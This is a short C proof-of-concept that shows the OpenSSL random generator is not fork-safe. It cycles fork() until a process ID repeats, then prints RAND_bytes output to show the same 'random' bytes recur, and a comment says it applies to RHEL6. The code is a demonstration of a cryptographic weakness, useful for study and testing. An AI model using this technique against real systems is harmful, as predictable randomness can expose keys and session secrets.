/* 
 Original: http://emboss.github.io/blog/2013/08/21/openssl-prng-is-not-really-fork-safe/
 Our patch do this attack relevant for RHel6 and others
 
 There are two variant:
 2. If its dynamical variable buff then malloc() return new memory page from OS, this page will be nulled
 This variant depend from previous memory allocations.
*/ 

#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdio.h>
#include <openssl/rand.h>

static void dump_random(void)
{
  int i;
  unsigned char *buf;

  buf = malloc( 4);

  RAND_bytes(buf, 4);
  printf("pid=%d ", getpid());
  for (i = 0; i < 4; i++) {
            printf("\\x%02x", buf[i]);
        }
  puts("");
}

int main(void)
{
  pid_t pid, xpid;

  /* PRNG needs to be initialized in original process to reproduce */
  RAND_bytes((unsigned char *)&pid, sizeof(pid));

  pid = fork();
  if (pid == 0) {
      dump_random();
      return 0;
  } else if (pid > 0) {
      wait(NULL);

      do {
          xpid = fork();
          if (xpid == 0) {
              if (getpid() == pid)
                  dump_random();
              return 0;
          } else if (xpid > 0) {
              wait(NULL);
          } else {
              perror("fork");
          }
      } while (pid != xpid);
  } else {
      perror("fork");
      return 1;
  }

  return 0;
}